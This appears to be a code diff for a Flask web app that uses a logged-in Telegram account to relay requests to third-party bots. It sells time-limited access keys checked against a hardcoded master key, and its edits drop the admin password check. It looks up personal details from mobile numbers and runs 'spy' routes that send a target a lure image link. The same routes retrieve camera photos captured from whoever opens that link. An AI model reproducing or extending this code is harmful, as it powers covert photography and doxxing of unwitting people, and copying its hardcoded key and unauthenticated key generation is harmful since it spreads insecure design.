@@ -1,5 +1,5 @@
 from flask import Flask, request, jsonify, render_template
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from flask_cors import CORS
 import asyncio
@@ -7,6 +7,7 @@ import re
 import io
 import os
 import json
+import base64
 import random
 import string
 from datetime import datetime, timedelta
@@ -33,95 +34,69 @@ client = TelegramClient(StringSession(session_string), api_id, api_hash, loop=lo
 last_photo_id = 0
 KEY_FILE = 'keys.json'
 
-# --- 🛠️ DATABASE SYSTEM (FIXED) ---
+# --- DATABASE SYSTEM ---
 def load_keys():
-    # Agar file nahi hai to empty dict return karo
-    if not os.path.exists(KEY_FILE):
-        return {}
+    if not os.path.exists(KEY_FILE): return {}
     try:
         with open(KEY_FILE, 'r') as f:
             content = f.read().strip()
-            if not content: return {} # Agar file khali hai
-            return json.loads(content)
-    except:
-        return {} # Agar JSON corrupt hai
+            return json.loads(content) if content else {}
+    except: return {}
 
 def save_keys(keys):
     try:
-        with open(KEY_FILE, 'w') as f:
-            json.dump(keys, f, indent=4)
-    except Exception as e:
-        print(f"Database Error: {e}")
+        with open(KEY_FILE, 'w') as f: json.dump(keys, f, indent=4)
+    except: pass
 
-# --- KEY VERIFICATION ROUTE ---
+# --- KEY VERIFICATION ---
 @app.route('/verify-access', methods=['POST'])
 def verify_access():
     try:
         data = request.json
         user_key = data.get('key', '').strip()
         
-        # MASTER KEY (Always works)
+        # MASTER KEY LOGIC
         if user_key == "FAIZAN_AZIZI_":
-            return jsonify({'status': 'valid', 'message': 'Master Access Granted'})
+            return jsonify({'status': 'valid', 'message': 'WELCOME OWNER FAIZAN!', 'is_admin': True})
 
         keys = load_keys()
-        
         if user_key in keys:
             key_data = keys[user_key]
             
-            # 1. Activate Unused Key
             if key_data['status'] == 'unused':
                 key_data['status'] = 'active'
                 key_data['start_time'] = datetime.now().isoformat()
-                
-                duration_hours = int(key_data['hours'])
-                expiry_time = datetime.now() + timedelta(hours=duration_hours)
-                key_data['expiry_time'] = expiry_time.isoformat()
-                
+                key_data['expiry_time'] = (datetime.now() + timedelta(hours=int(key_data['hours']))).isoformat()
                 save_keys(keys)
-                return jsonify({'status': 'valid', 'message': f'Key Activated! Valid for {duration_hours} Hours.'})
+                return jsonify({'status': 'valid', 'message': f'Key Activated! Valid for {key_data["hours"]} Hours.', 'is_admin': False})
             
-            # 2. Check Active Key Expiry
             elif key_data['status'] == 'active':
                 expiry = datetime.fromisoformat(key_data['expiry_time'])
                 if datetime.now() < expiry:
-                    remaining = expiry - datetime.now()
-                    rem_str = str(remaining).split('.')[0]
-                    return jsonify({'status': 'valid', 'message': f'Access Granted. Time left: {rem_str}'})
+                    rem = str(expiry - datetime.now()).split('.')[0]
+                    return jsonify({'status': 'valid', 'message': f'Active. Expires in: {rem}', 'is_admin': False})
                 else:
-                    return jsonify({'status': 'expired', 'message': 'Key has EXPIRED. Please buy a new one.'})
+                    return jsonify({'status': 'expired', 'message': 'Key Expired.'})
         
-        return jsonify({'status': 'invalid', 'message': 'Invalid Access Key'})
+        return jsonify({'status': 'invalid', 'message': 'Invalid Key'})
     except Exception as e:
-        return jsonify({'status': 'error', 'message': f'Server Error: {str(e)}'})
+        return jsonify({'status': 'error', 'message': str(e)})
 
-# --- ADMIN GENERATE ROUTE ---
+# --- ADMIN KEY GEN ---
 @app.route('/admin-gen', methods=['POST'])
 def generate_key():
     try:
         data = request.json
-        admin_pass = data.get('password')
         hours = data.get('hours')
-        
-        if admin_pass != "OWNER_FAIZAN":
-            return jsonify({'error': 'Wrong Password'})
-        
-        # Generate Random Key
+        # Direct generation, security handled by frontend/master key check
         new_key = "AZ-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-        
         keys = load_keys()
-        keys[new_key] = {
-            'hours': int(hours),
-            'status': 'unused',
-            'created_at': datetime.now().isoformat()
-        }
+        keys[new_key] = {'hours': int(hours), 'status': 'unused', 'created_at': datetime.now().isoformat()}
         save_keys(keys)
-        
         return jsonify({'key': new_key, 'duration': f'{hours} Hours'})
-    except Exception as e:
-        return jsonify({'error': f'Server Error: {str(e)}'})
+    except Exception as e: return jsonify({'error': str(e)})
 
-# --- WHOSIM LOGIC ---
+# --- WHOSIM LOGIC (UNTOUCHED) ---
 def clean_and_format_text(text):
     if not text: return ""
     text = text.replace("MAXX", "FAIZAN AZIZI")
@@ -134,26 +109,21 @@ async def ask_telegram_final(mobile_number):
     try:
         if not client.is_connected(): await client.connect()
         await client.send_message(WHOSIM_BOT, mobile_number)
-        
         for i in range(30):
             await asyncio.sleep(1) 
             history = await client.get_messages(WHOSIM_BOT, limit=1)
-            
             if history:
                 msg = history[0]
                 content = msg.message or msg.caption or ""
-                
                 if not msg.out:
                     if "Results" in content or "Name" in content or "Mobile" in content:
                         return clean_and_format_text(content)
                     if len(content) > 15 and "Search" not in content and "Wait" not in content:
                         return clean_and_format_text(content)
+        return "Timeout."
+    except Exception as e: return f"System Error: {str(e)}"
 
-        return "Timeout: Data not found or Bot is slow."
-    except Exception as e:
-        return f"System Error: {str(e)}"
-
-# --- CAMERA LOGIC ---
+# --- CAMERA LOGIC (FIXED PHOTO DOWNLOAD) ---
 async def start_camera_session():
     try:
         if not client.is_connected(): await client.connect()
@@ -164,18 +134,15 @@ async def start_camera_session():
                 for row in message.buttons:
                     for button in row:
                         if "camera" in button.text.lower():
-                            await button.click()
-                            break
+                            await button.click(); break
         for i in range(10):
             await asyncio.sleep(1)
             history = await client.get_messages(CAMERA_BOT, limit=1)
             if history:
                 msg = history[0]
-                if "Session" in msg.text and "created" in msg.text:
-                    return msg.text
-        return "Failed to start session automatically."
-    except Exception as e:
-        return str(e)
+                if "Session" in msg.text and "created" in msg.text: return msg.text
+        return "Failed to start session."
+    except Exception as e: return str(e)
 
 async def upload_camera_image(file_bytes):
     global last_photo_id
@@ -184,74 +151,72 @@ async def upload_camera_image(file_bytes):
         history = await client.get_messages(CAMERA_BOT, limit=1)
         if history: last_photo_id = history[0].id
         f = io.BytesIO(file_bytes)
-        f.name = "target.jpg"
+        f.name = "target.jpg" 
         await client.send_file(CAMERA_BOT, f, force_document=False)
         for i in range(15):
             await asyncio.sleep(1)
             history = await client.get_messages(CAMERA_BOT, limit=3)
             for msg in history:
                 if msg.id > last_photo_id and ("http" in msg.text):
-                    last_photo_id = msg.id 
-                    return msg.text 
-        return "Link not received yet."
-    except Exception as e:
-        return str(e)
+                    last_photo_id = msg.id; return msg.text 
+        return "Link not received."
+    except Exception as e: return str(e)
 
+# --- 🛠️ FIXED PHOTO CHECK FUNCTION ---
 async def check_new_photos():
     global last_photo_id
     new_photos = []
     try:
         if not client.is_connected(): await client.connect()
         messages = await client.get_messages(CAMERA_BOT, min_id=last_photo_id, limit=20)
+        
         for msg in messages:
             if msg.photo:
-                blob = await client.download_media(msg.photo, file=bytes)
-                b64 = base64.b64encode(blob).decode('utf-8')
+                # Create a memory buffer
+                buffer = io.BytesIO()
+                # Download into buffer
+                await client.download_media(msg.photo, file=buffer)
+                # Reset pointer to start
+                buffer.seek(0)
+                # Encode to Base64
+                b64 = base64.b64encode(buffer.read()).decode('utf-8')
                 new_photos.append(b64)
+                
                 if msg.id > last_photo_id: last_photo_id = msg.id
+        
         return new_photos
     except Exception as e:
+        print(f"Photo Error: {e}")
         return []
 
 # --- ROUTES ---
 @app.route('/')
-def home():
-    return render_template('index.html')
+def home(): return render_template('index.html')
 
 @app.route('/get-info', methods=['POST'])
 def get_info():
     data = request.json
-    mobile_number = data.get('number')
     try:
-        result = client.loop.run_until_complete(ask_telegram_final(mobile_number))
+        result = client.loop.run_until_complete(ask_telegram_final(data.get('number')))
         return jsonify({'details': result})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+    except Exception as e: return jsonify({'error': str(e)}), 500
 
 @app.route('/spy-start', methods=['POST'])
 def spy_start():
-    try:
-        msg = client.loop.run_until_complete(start_camera_session())
-        return jsonify({'message': msg})
-    except Exception as e:
-        return jsonify({'error': str(e)})
+    try: return jsonify({'message': client.loop.run_until_complete(start_camera_session())})
+    except Exception as e: return jsonify({'error': str(e)})
 
 @app.route('/spy-upload', methods=['POST'])
 def spy_upload():
-    if 'file' not in request.files: return jsonify({'error': 'No file'})
     try:
         link = client.loop.run_until_complete(upload_camera_image(request.files['file'].read()))
         return jsonify({'link': link})
-    except Exception as e:
-        return jsonify({'error': str(e)})
+    except Exception as e: return jsonify({'error': str(e)})
 
 @app.route('/spy-check', methods=['POST'])
 def spy_check():
-    try:
-        photos = client.loop.run_until_complete(check_new_photos())
-        return jsonify({'photos': photos})
-    except Exception as e:
-        return jsonify({'error': str(e)})
+    try: return jsonify({'photos': client.loop.run_until_complete(check_new_photos())})
+    except Exception as e: return jsonify({'error': str(e)})
 
 if __name__ == '__main__':
     client.start()
